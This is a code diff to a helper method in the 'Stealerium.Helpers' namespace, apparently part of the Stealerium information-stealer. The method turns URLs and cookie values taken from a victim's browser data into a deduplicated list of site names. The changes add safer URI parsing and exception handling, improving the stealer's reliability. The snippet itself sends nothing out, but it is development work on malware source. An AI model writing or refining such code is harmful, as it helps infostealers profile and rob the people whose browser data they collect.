@@ -37,35 +37,49 @@ namespace Stealerium.Helpers
         // Add value to list
         private static bool AppendValue(string value, List<string> domains)
         {
-            var domain = value
-                .Replace("www.", "").ToLower();
+            string domain = value.Replace("www.", "").ToLower();
+
             // Remove search results
-            if (
-                domain.Contains("google") ||
+            if (domain.Contains("google") ||
                 domain.Contains("bing") ||
                 domain.Contains("yandex") ||
                 domain.Contains("duckduckgo"))
                 return false;
-            // If cookie value
-            if (domain
-                .StartsWith("."))
-                domain = domain.Substring(1);
-            // Get hostname from url
+
+            // Handle URI and get domain safely
             try
             {
-                domain = new Uri(domain).Host;
+                Uri uriResult;
+                bool result = Uri.TryCreate(value, UriKind.Absolute, out uriResult);
+                if (result && uriResult != null)
+                {
+                    domain = uriResult.Host;
+                }
             }
             catch (UriFormatException)
             {
+                // Ignore malformed URLs
+                return false;
             }
 
-            // Remove .com, .org
-            domain = Path.GetFileNameWithoutExtension(domain);
+            // Remove .com, .org, etc.
+            try
+            {
+                domain = Path.GetFileNameWithoutExtension(domain);
+            }
+            catch (ArgumentException)
+            {
+                // Catch any exceptions caused by illegal characters in the domain
+                return false;
+            }
+
             domain = domain.Replace(".com", "").Replace(".org", "");
+
             // Check if domain already exists in list
             foreach (var domainValue in domains)
                 if (domain.ToLower().Replace(" ", "").Contains(domainValue.ToLower().Replace(" ", "")))
                     return false;
+
             // Convert first char to upper-case
             domain = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(domain);
             domains.Add(domain);
